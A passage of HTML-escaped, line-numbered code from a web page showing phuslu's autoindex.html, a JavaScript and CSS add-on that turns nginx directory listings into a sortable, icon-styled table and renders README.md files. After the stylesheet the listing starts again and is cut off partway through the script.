class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!-- autoindex.html 19.08, see https:&#x2F;&#x2F;phuslu.github.io --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">!function()&#123;</span><br><span class="line"> var website_title &#x3D; &#39;&#39;</span><br><span class="line"> var datetime_format &#x3D; &#39;%d-%b-%Y %H:%M&#39;</span><br><span class="line"> var show_readme_md &#x3D; true</span><br><span class="line"> var max_name_length &#x3D; 50</span><br><span class="line"></span><br><span class="line"> var dom &#x3D; &#123;</span><br><span class="line">  element: null,</span><br><span class="line">  get: function (o) &#123;</span><br><span class="line">   var obj &#x3D; Object.create(this)</span><br><span class="line">   obj.element &#x3D; (typeof o &#x3D;&#x3D; &quot;object&quot;) ? o : document.createElement(o)</span><br><span class="line">   return obj</span><br><span class="line">  &#125;,</span><br><span class="line">  add: function (o) &#123;</span><br><span class="line">   var obj &#x3D; dom.get(o)</span><br><span class="line">   this.element.appendChild(obj.element)</span><br><span class="line">   return obj</span><br><span class="line">  &#125;,</span><br><span class="line">  text: function (t) &#123;</span><br><span class="line">   this.element.appendChild(document.createTextNode(t))</span><br><span class="line">   return this</span><br><span class="line">  &#125;,</span><br><span class="line">  html: function (s) &#123;</span><br><span class="line">   this.element.innerHTML &#x3D; s</span><br><span class="line">   return this</span><br><span class="line">  &#125;,</span><br><span class="line">  attr: function (k, v) &#123;</span><br><span class="line">   this.element.setAttribute(k, v)</span><br><span class="line">   return this</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> head &#x3D; dom.get(document.head)</span><br><span class="line"> head.add(&#39;meta&#39;).attr(&#39;charset&#39;, &#39;utf-8&#39;)</span><br><span class="line"> head.add(&#39;meta&#39;).attr(&#39;name&#39;, &#39;viewport&#39;).attr(&#39;content&#39;, &#39;width&#x3D;device-width,initial-scale&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line"> if (!document.title) &#123;</span><br><span class="line">  document.write([&quot;&lt;div class&#x3D;\&quot;container\&quot;&gt;&quot;,</span><br><span class="line">  &quot;&lt;h3&gt;nginx.conf&lt;&#x2F;h3&gt;&quot;,</span><br><span class="line">  &quot;&lt;textarea rows&#x3D;8 cols&#x3D;50&gt;&quot;,</span><br><span class="line">  &quot;# download autoindex.html to &#x2F;wwwroot&#x2F;&quot;,</span><br><span class="line">  &quot;location ~ ^(.*)&#x2F;$ &#123;&quot;,</span><br><span class="line">  &quot;    charset utf-8;&quot;,</span><br><span class="line">  &quot;    autoindex on;&quot;,</span><br><span class="line">  &quot;    autoindex_localtime on;&quot;,</span><br><span class="line">  &quot;    autoindex_exact_size off;&quot;,</span><br><span class="line">  &quot;    add_after_body &#x2F;autoindex.html;&quot;,</span><br><span class="line">  &quot;&#125;&quot;,</span><br><span class="line">  &quot;&lt;&#x2F;textarea&gt;&quot;,</span><br><span class="line">  &quot;&lt;&#x2F;div&gt;&quot;].join(&quot;\n&quot;))</span><br><span class="line">  return</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> var bodylines &#x3D; document.body.innerHTML.split(&#39;\n&#39;)</span><br><span class="line"> document.body.innerHTML &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"> var titlehtml &#x3D; document.title.replace(&#x2F;\&#x2F;$&#x2F;, &#39;&#39;).split(&#39;&#x2F;&#39;).slice(1).reduce(function(acc, v, i, a) &#123;</span><br><span class="line">  return acc + &#39;&lt;a href&#x3D;&quot;&#x2F;&#39; + a.slice(0, i+1).join(&#39;&#x2F;&#39;) + &#39;&#x2F;&quot;&gt;&#39; + v + &#39;&lt;&#x2F;a&gt;&#x2F;&#39;</span><br><span class="line"> &#125;, &#39;Index of &#x2F;&#39;)</span><br><span class="line"> if (website_title) &#123;</span><br><span class="line">  document.title &#x3D; website_title + &#39; - &#39; + document.title</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> div &#x3D; dom.get(&#39;div&#39;).attr(&#39;class&#39;, &#39;container&#39;)</span><br><span class="line"> div.add(&#39;table&#39;).add(&#39;tbody&#39;).add(&#39;tr&#39;).add(&#39;th&#39;).html(titlehtml)</span><br><span class="line"> tbody &#x3D; div.add(&#39;table&#39;).attr(&#39;class&#39;, &#39;table-hover&#39;).add(&#39;tbody&#39;)</span><br><span class="line"></span><br><span class="line"> names &#x3D; [&#39;Name&#39;, &#39;Date&#39;, &#39;Size&#39;]</span><br><span class="line"> thead &#x3D; tbody.add(&#39;tr&#39;)</span><br><span class="line"> for (i &#x3D; 0; i &lt; names.length; i++)</span><br><span class="line">  thead.add(&#39;td&#39;).add(&#39;a&#39;).attr(&#39;href&#39;, &#39;javascript:sortby(&#39;+i+&#39;)&#39;).attr(&#39;class&#39;, &#39;octicon arrow-up&#39;).text(names[i]);</span><br><span class="line"></span><br><span class="line"> var insert &#x3D; function(filename, datetime, size) &#123;</span><br><span class="line">  if (&#x2F;\&#x2F;$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-directory&#39;</span><br><span class="line">   size &#x3D; &#39;&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(zip|7z|bz2|gz|tar|tgz|tbz2|xz|cab)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-zip&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(py|js|php|pl|rb|sh|bash|lua|sql|go|rs|java|c|h|cpp|cxx|hpp)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-code&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(jpg|png|bmp|gif|ico|webp)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;file-media&#39;</span><br><span class="line">  &#125; else if (&#x2F;\.(flv|mp4|mkv|avi|mkv|vp9)$&#x2F;.test(filename)) &#123;</span><br><span class="line">   css &#x3D; &#39;device-camera-video&#39;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">   css &#x3D; &#39;file&#39;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  displayname &#x3D; decodeURIComponent(filename.replace(&#x2F;\&#x2F;$&#x2F;, &#39;&#39;))</span><br><span class="line">  if (displayname.length &gt; max_name_length)</span><br><span class="line">   displayname &#x3D; displayname.substring(0, max_name_length-3) + &#39;..&gt;&#39;;</span><br><span class="line"></span><br><span class="line">  if (!isNaN(Date.parse(datetime))) &#123;</span><br><span class="line">   d &#x3D; new Date(datetime)</span><br><span class="line">   pad &#x3D; function (s) &#123;return s &lt; 10 ? &#39;0&#39; + s : s&#125;</span><br><span class="line">   mon &#x3D; function (m) &#123;return [&#39;Jan&#39;,&#39;Feb&#39;,&#39;Mar&#39;,&#39;Apr&#39;,&#39;May&#39;,&#39;Jun&#39;,&#39;Jul&#39;,&#39;Aug&#39;,&#39;Sep&#39;,&#39;Oct&#39;,&#39;Nov&#39;,&#39;Dec&#39;][m]&#125;</span><br><span class="line">   datetime &#x3D; datetime_format</span><br><span class="line">     .replace(&#39;%Y&#39;, d.getFullYear())</span><br><span class="line">     .replace(&#39;%m&#39;, pad(d.getMonth()+1))</span><br><span class="line">     .replace(&#39;%d&#39;, pad(d.getDate()))</span><br><span class="line">     .replace(&#39;%H&#39;, pad(d.getHours()))</span><br><span class="line">     .replace(&#39;%M&#39;, pad(d.getMinutes()))</span><br><span class="line">     .replace(&#39;%S&#39;, pad(d.getSeconds()))</span><br><span class="line">     .replace(&#39;%b&#39;, mon(d.getMonth()))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  tr &#x3D; tbody.add(&#39;tr&#39;)</span><br><span class="line">  tr.add(&#39;td&#39;).add(&#39;a&#39;).attr(&#39;class&#39;, &#39;octicon &#39; + css).attr(&#39;href&#39;, filename).text(displayname)</span><br><span class="line">  tr.add(&#39;td&#39;).text(datetime)</span><br><span class="line">  tr.add(&#39;td&#39;).text(size)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> var readme &#x3D; &#39;&#39;</span><br><span class="line"> insert(&#39;..&#x2F;&#39;, &#39;&#39;, &#39;-&#39;)</span><br><span class="line"> for (var i in bodylines) &#123;</span><br><span class="line">  if (m &#x3D; &#x2F;\s*&lt;a href&#x3D;&quot;(.+?)&quot;&gt;(.+?)&lt;\&#x2F;a&gt;\s+(\S+)\s+(\S+)\s+(\S+)\s*&#x2F;.exec(bodylines[i])) &#123;</span><br><span class="line">   filename &#x3D; m[1]</span><br><span class="line">   datetime &#x3D; m[3] + &#39; &#39; + m[4]</span><br><span class="line">   size &#x3D; m[5]</span><br><span class="line">   insert(filename, datetime, size)</span><br><span class="line">   if (filename.toLowerCase() &#x3D;&#x3D; &#39;readme.md&#39;) &#123;</span><br><span class="line">    readme &#x3D; filename</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> document.body.appendChild(div.element)</span><br><span class="line"></span><br><span class="line"> if (show_readme_md &amp;&amp; readme !&#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">  tbody &#x3D; div.add(&#39;table&#39;).add(&#39;tbody&#39;);</span><br><span class="line">  tbody.add(&#39;tr&#39;).add(&#39;th&#39;).attr(&#39;class&#39;, &#39;octicon octicon-book&#39;).text(readme)</span><br><span class="line">  tbody.add(&#39;tr&#39;).add(&#39;td&#39;).add(&#39;div&#39;).attr(&#39;id&#39;, &#39;readme&#39;).attr(&#39;class&#39;, &#39;markdown-body&#39;)</span><br><span class="line">  var xhr &#x3D; new XMLHttpRequest()</span><br><span class="line">  xhr.open(&#39;GET&#39;, location.pathname.replace(&#x2F;[^&#x2F;]+$&#x2F;, &#39;&#39;)+readme, true)</span><br><span class="line">  xhr.onload &#x3D; function() &#123;</span><br><span class="line">   if (xhr.status &gt;&#x3D; 200 &amp;&amp; xhr.status &lt; 400) &#123;</span><br><span class="line">    wait &#x3D; function (name, callback) &#123;</span><br><span class="line">     var interval &#x3D; 10; &#x2F;&#x2F; ms</span><br><span class="line">     window.setTimeout(function() &#123;</span><br><span class="line">      if (window[name]) &#123;</span><br><span class="line">       callback(window[name])</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">       window.setTimeout(arguments.callee, interval)</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;, interval)</span><br><span class="line">    &#125;</span><br><span class="line">    wait(&#39;marked&#39;, function() &#123;</span><br><span class="line">     document.getElementById(&quot;readme&quot;).innerHTML &#x3D; marked(xhr.responseText)</span><br><span class="line">    &#125;)</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send()</span><br><span class="line"></span><br><span class="line">  div.add(&#39;script&#39;).attr(&#39;src&#39;, &#39;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;marked&#x2F;0.7.0&#x2F;marked.min.js&#39;)</span><br><span class="line">  div.add(&#39;link&#39;).attr(&#39;rel&#39;, &#39;stylesheet&#39;).attr(&#39;href&#39;, &#39;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;github-markdown-css&#x2F;3.0.1&#x2F;github-markdown.min.css&#39;)</span><br><span class="line"> &#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">function sortby(index) &#123;</span><br><span class="line"> rows &#x3D; document.getElementsByClassName(&#39;table-hover&#39;)[0].rows</span><br><span class="line"> link &#x3D; rows[0].getElementsByTagName(&#39;a&#39;)[index]</span><br><span class="line"> arrow &#x3D; link.className &#x3D;&#x3D; &#39;octicon arrow-down&#39; ? 1 : -1</span><br><span class="line"> link.className &#x3D; &#39;octicon arrow-&#39; + (arrow &#x3D;&#x3D; 1 ? &#39;up&#39; : &#39;down&#39;);</span><br><span class="line"> [].slice.call(rows).slice(2).map(function (e, i) &#123;</span><br><span class="line">  type &#x3D; e.getElementsByTagName(&#39;a&#39;)[0].className &#x3D;&#x3D; &#39;octicon file-directory&#39; ? 0 : 1</span><br><span class="line">  text &#x3D; e.getElementsByTagName(&#39;td&#39;)[index].innerText</span><br><span class="line">  if (index &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">   value &#x3D; text</span><br><span class="line">  &#125; else if (index &#x3D;&#x3D;&#x3D; 1) &#123;</span><br><span class="line">   value &#x3D; new Date(text).getTime()</span><br><span class="line">  &#125; else if (index &#x3D;&#x3D;&#x3D; 2) &#123;</span><br><span class="line">   m &#x3D; &#123;&#39;G&#39;:1024*1024*1024, &#39;M&#39;:1024*1024, &#39;K&#39;:1024&#125;</span><br><span class="line">   value &#x3D; parseInt(text || 0) * (m[text[text.search(&#x2F;[KMG]B?$&#x2F;)]] || 1)</span><br><span class="line">  &#125;</span><br><span class="line">  return &#123;type: type, value: value, index: i, html: e.innerHTML&#125;</span><br><span class="line"> &#125;).sort(function (a, b) &#123;</span><br><span class="line">  if (a.type !&#x3D; b.type)</span><br><span class="line">   return a.type - b.type</span><br><span class="line">  if (a.value !&#x3D; b.value)</span><br><span class="line">   return a.value &lt; b.value ? -arrow : arrow</span><br><span class="line">  return a.index &lt; b.index ? -arrow : arrow</span><br><span class="line"> &#125;).forEach(function (e, i) &#123;</span><br><span class="line">  rows[2+i].innerHTML &#x3D; e.html</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">body &#123;</span><br><span class="line"> margin: 0;</span><br><span class="line"> font-family: &quot;ubuntu&quot;, &quot;Tahoma&quot;, &quot;Microsoft YaHei&quot;, Arial, Serif;</span><br><span class="line">&#125;</span><br><span class="line">.container &#123;</span><br><span class="line"> padding-right: 15px;</span><br><span class="line"> padding-left: 15px;</span><br><span class="line"> margin-right: auto;</span><br><span class="line"> margin-left: auto;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 768px) &#123;</span><br><span class="line"> .container &#123;</span><br><span class="line">  max-width: 750px;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 992px) &#123;</span><br><span class="line"> .container &#123;</span><br><span class="line">  max-width: 970px;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">@media (min-width: 1200px) &#123;</span><br><span class="line"> .container &#123;</span><br><span class="line">  max-width: 1170px;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">table &#123;</span><br><span class="line"> width: 100%;</span><br><span class="line"> max-width: 100%;</span><br><span class="line"> margin-bottom: 20px;</span><br><span class="line"> border: 1px solid #ddd;</span><br><span class="line"> padding: 0;</span><br><span class="line"> border-collapse: collapse;</span><br><span class="line">&#125;</span><br><span class="line">table th &#123;</span><br><span class="line"> font-size: 14px;</span><br><span class="line">&#125;</span><br><span class="line">table tr &#123;</span><br><span class="line"> border: 1px solid #ddd;</span><br><span class="line"> padding: 5px;</span><br><span class="line">&#125;</span><br><span class="line">table tr:nth-child(odd) &#123;</span><br><span class="line"> background: #f9f9f9</span><br><span class="line">&#125;</span><br><span class="line">table th, table td &#123;</span><br><span class="line"> border: 1px solid #ddd;</span><br><span class="line"> font-size: 14px;</span><br><span class="line"> line-height: 20px;</span><br><span class="line"> padding: 3px;</span><br><span class="line"> text-align: left;</span><br><span class="line">&#125;</span><br><span class="line">a &#123;</span><br><span class="line"> color: #337ab7;</span><br><span class="line"> text-decoration: none;</span><br><span class="line">&#125;</span><br><span class="line">a:hover, a:focus &#123;</span><br><span class="line"> color: #2a6496;</span><br><span class="line"> text-decoration: underline;</span><br><span class="line">&#125;</span><br><span class="line">table.table-hover &gt; tbody &gt; tr:hover &gt; td,</span><br><span class="line">table.table-hover &gt; tbody &gt; tr:hover &gt; th &#123;</span><br><span class="line"> background-color: #f5f5f5;</span><br><span class="line">&#125;</span><br><span class="line">.markdown-body &#123;</span><br><span class="line"> float: left;</span><br><span class="line"> font-family: &quot;ubuntu&quot;, &quot;Tahoma&quot;, &quot;Microsoft YaHei&quot;, Arial, Serif;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* octicons *&#x2F;</span><br><span class="line">.octicon &#123;</span><br><span class="line"> background-position: center left;</span><br><span class="line"> background-repeat: no-repeat;</span><br><span class="line"> padding-left: 16px;</span><br><span class="line">&#125;</span><br><span class="line">.file &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M6 5L2 5 2 4 6 4 6 5 6 5ZM2 8L9 8 9 7 2 7 2 8 2 8ZM2 10L9 10 9 9 2 9 2 10 2 10ZM2 12L9 12 9 11 2 11 2 12 2 12ZM12 4.5L12 14C12 14.6 11.6 15 11 15L1 15C0.5 15 0 14.6 0 14L0 2C0 1.5 0.5 1 1 1L8.5 1 12 4.5 12 4.5ZM11 5L8 2 1 2 1 14 11 14 11 5 11 5Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-directory &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;14&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 14 16&#39;%3E%3Cpath d&#x3D;&#39;M13 4L7 4 7 3C7 2.3 6.7 2 6 2L1 2C0.5 2 0 2.5 0 3L0 13C0 13.6 0.5 14 1 14L13 14C13.6 14 14 13.6 14 13L14 5C14 4.5 13.6 4 13 4L13 4ZM6 4L1 4 1 3 6 3 6 4 6 4Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-zip &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M8.5 1L1 1C0.4 1 0 1.4 0 2L0 14C0 14.6 0.4 15 1 15L11 15C11.6 15 12 14.6 12 14L12 4.5 8.5 1ZM11 14L1 14 1 2 4 2 4 3 5 3 5 2 8 2 11 5 11 14 11 14ZM5 4L5 3 6 3 6 4 5 4 5 4ZM4 4L5 4 5 5 4 5 4 4 4 4ZM5 6L5 5 6 5 6 6 5 6 5 6ZM4 6L5 6 5 7 4 7 4 6 4 6ZM5 8L5 7 6 7 6 8 5 8 5 8ZM4 9.3C3.4 9.6 3 10.3 3 11L3 12 7 12 7 11C7 9.9 6.1 9 5 9L5 8 4 8 4 9.3 4 9.3ZM6 10L6 11 4 11 4 10 6 10 6 10Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-code &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M8.5,1 L1,1 C0.45,1 0,1.45 0,2 L0,14 C0,14.55 0.45,15 1,15 L11,15 C11.55,15 12,14.55 12,14 L12,4.5 L8.5,1 L8.5,1 Z M11,14 L1,14 L1,2 L8,2 L11,5 L11,14 L11,14 Z M5,6.98 L3.5,8.5 L5,10 L4.5,11 L2,8.5 L4.5,6 L5,6.98 L5,6.98 Z M7.5,6 L10,8.5 L7.5,11 L7,10.02 L8.5,8.5 L7,7 L7.5,6 L7.5,6 Z&#39; fill&#x3D;&#39;%237D94AE&#39; &#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.file-media &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;12&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 12 16&#39;%3E%3Cpath d&#x3D;&#39;M6 5L8 5 8 7 6 7 6 5 6 5ZM12 4.5L12 14C12 14.6 11.6 15 11 15L1 15C0.5 15 0 14.6 0 14L0 2C0 1.5 0.5 1 1 1L8.5 1 12 4.5 12 4.5ZM11 5L8 2 1 2 1 13 4 8 6 12 8 10 11 13 11 5 11 5Z&#39; fill&#x3D;&#39;%237D94AE&#39;&#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.device-camera-video &#123;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;16&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 16 16&#39;%3E%3Cpath d&#x3D;&#39;M15.2,2.09 L10,5.72 L10,3 C10,2.45 9.55,2 9,2 L1,2 C0.45,2 0,2.45 0,3 L0,12 C0,12.55 0.45,13 1,13 L9,13 C9.55,13 10,12.55 10,12 L10,9.28 L15.2,12.91 C15.53,13.14 16,12.91 16,12.5 L16,2.5 C16,2.09 15.53,1.86 15.2,2.09 L15.2,2.09 Z&#39; fill&#x3D;&#39;%237D94AE&#39; &#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.octicon-book &#123;</span><br><span class="line"> padding-left: 20px;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;16&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 16 16&#39;%3E%3Cpath d&#x3D;&#39;M3,5 L7,5 L7,6 L3,6 L3,5 L3,5 Z M3,8 L7,8 L7,7 L3,7 L3,8 L3,8 Z M3,10 L7,10 L7,9 L3,9 L3,10 L3,10 Z M14,5 L10,5 L10,6 L14,6 L14,5 L14,5 Z M14,7 L10,7 L10,8 L14,8 L14,7 L14,7 Z M14,9 L10,9 L10,10 L14,10 L14,9 L14,9 Z M16,3 L16,12 C16,12.55 15.55,13 15,13 L9.5,13 L8.5,14 L7.5,13 L2,13 C1.45,13 1,12.55 1,12 L1,3 C1,2.45 1.45,2 2,2 L7.5,2 L8.5,3 L9.5,2 L15,2 C15.55,2 16,2.45 16,3 L16,3 Z M8,3.5 L7.5,3 L2,3 L2,12 L8,12 L8,3.5 L8,3.5 Z M15,3 L9.5,3 L9,3.5 L9,12 L15,12 L15,3 L15,3 Z&#39; &#x2F;%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.arrow-down &#123;</span><br><span class="line"> font-weight: bold;</span><br><span class="line"> text-decoration: none !important;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;10&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 10 16&#39;%3E%3Cpolygon id&#x3D;&#39;Shape&#39; points&#x3D;&#39;7 7 7 3 3 3 3 7 0 7 5 13 10 7&#39;%3E%3C&#x2F;polygon%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">.arrow-up &#123;</span><br><span class="line"> font-weight: bold;</span><br><span class="line"> text-decoration: none !important;</span><br><span class="line"> background-image: url(&quot;data:image&#x2F;svg+xml;charset&#x3D;utf8,%3Csvg xmlns&#x3D;&#39;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&#39; width&#x3D;&#39;10&#39; height&#x3D;&#39;16&#39; viewBox&#x3D;&#39;0 0 10 16&#39;%3E%3Cpolygon id&#x3D;&#39;Shape&#39; points&#x3D;&#39;5 3 0 9 3 9 3 13 7 13 7 9 10 9&#39;%3E%3C&#x2F;polygon%3E%3C&#x2F;svg%3E&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;!-- autoindex.html 19.08, see https:&#x2F;&#x2F;phuslu.github.io --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">!function()&#123;</span><br><span class="line"> var website_title &#x3D; &#39;&#39;</span><br><span class="line"> var datetime_format &#x3D; &#39;%d-%b-%Y %H:%M&#39;</span><br><span class="line"> var show_readme_md &#x3D; true</span><br><span class="line"> var max_name_length &#x3D; 50</span><br><span class="line"></span><br><span class="line"> var dom &#x3D; &#123;</span><br><span class="line">  element: null,</span><br><span class="line">  get: function (o) &#123;</span><br><span class="line">   var obj &#x3D; Object.create(this)</span><br><span class="line">   obj.element &#x3D; (typeof o &#x3D;&#x3D; &quot;object&quot;) ? o : document.createElement(o)</span><br><span class="line">   return obj</span><br><span class="line">  &#125;,</span><br><span class="line">  add: function (o) &#123;</span><br><span class="line">   var obj &#x3D; dom.get(o)</span><br><span class="line">   this.element.appendChild(obj.element)</span><br><span class="line">   return obj</span><br><span class="line">  &#125;,</span><br><span class="line">  text: function (t) &#123;</span><br><span class="line">   this.element.appendChild(document.createTextNode(t))</span><br><span class="line">   return this</span><br><span class="line">  &#125;,</span><br><span class="line">  html: function (s) &#123;</span><br><span class="line">   this.element.innerHTML &#x3D; s</span><br><span class="line">   return this</span><br><span class="line">  &#125;,</span><br><span class="line">  attr: function (k, v) &#123;</span><br><span class="line">   this.element.setAttribute(k, v)</span><br><span class="line">   return this</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> head &#x3D; dom.get(document.head)</span><br><span class="line"> head.add(&#39;meta&#39;).attr(&#39;charset&#39;, &#39;utf-8&#39;)</span><br><span class="line"> head.add(&#39;meta&#39;).attr(&#39;name&#39;, &#39;viewport&#39;).attr(&#39;content&#39;, &#39;width&#x3D;device-width,initial-scale&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line"> if (!document.title) &#123;</span><br><span class="line">  document.write([&quot;&lt;div class&#x3D;\&quot;container\&quot;&gt;&quot;,</span><br><span class="line">  &quot;&lt;h3&gt;nginx.conf&lt;&#x2F;h3&gt;&quot;,</span><br><span class="line">  &quot;&lt;textarea rows&#x3D;8 cols&#x3D;50&gt;&quot;,</span><br><span class="line">  &quot;# download autoindex.html to &#x2F;wwwroot&#x2F;&quot;,</span><br><span class="line">  &quot;location ~ ^(.*)&#x2F;$ &#123;&quot;,</span><br><span class="line">  &quot;    charset utf-8;&quot;,</span><br><span class="line">  &quot;    autoindex on;&quot;,</span><br><span class="line">  &quot;    autoindex_localtime on;&quot;,</span><br><span class="line">  &quot;    autoindex_exact_size off;&quot;,</span><br><span class="line">  &quot;    add_after_body &#x2F;autoindex.html;&quot;,</span><br><span class="line">  &quot;&#125;&quot;,</span><br><span class="line">  &quot;&lt;&#x2F;textarea&gt;&quot;,</span><br><span class="line">  &quot;&lt;&#x2F;div&gt;&quot;].join(&quot;\n&quot;))</span><br><span class="line">  return</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> var bodylines &#x3D; document.body.innerHTML.split(&#39;\n&#39;)</span><br><span class="line"> document.body.innerHTML &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line"> var titlehtml &#x3D; document.title.replace(&#x2F;\&#x2F;$&#x2F;, &#39;&#39;).split(&#39;&#x2F;&#39;).slice(1).reduce(function(acc, v, i, a) &#123;</span><br><span class="line">  return acc + &#39;&lt;a href&#x3D;&quot;&#x2F;&#39; + a.slice(0, i+1).join(&#39;&#x2F;&#39;) + &#39;&#x2F;&quot;&gt;&#39; + v + &#39;&lt;&#x2F;a&gt;&#x2F;&#39;</span><br><span class="line"> &#125;, &#39;Index of &#x2F;&#39;)</span><br><span class="line"> if (website_title) &#123;</span><br><span class="line">  document.title &#x3D; website_title + &#39; - &#39; + document.title</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> div &#x3D; dom.get(&#39;div&#39;).attr(&#39;class&#39;, &#39;container&#39;)</span><br><span class="line"> div.add(&#39;table&#39;).add(&#39;tbody&#39;).add(&#39;tr&#39;).add(&#39;th&#39;).html(titlehtml)</span><br><span class="line"> tbody &#x3D; div.add(&#39;table&#39;).attr(&#39;class&#39;, &#39;table-hover&#39;).add(&#39;tbody&#39;)</span><br><span class="line"></span><br><span class="line"> names &#x3D; [&#39;Name&#39;, &#39;Date&#39;, &#39;Size&#39;]</span><br><span class="line"> thead &#x3D; tbody.add(&#39;tr&#39;)</span><br><span class="line"> for (i &#x3D; 0; i &lt; names.length; i++)</span><br><span class="line">  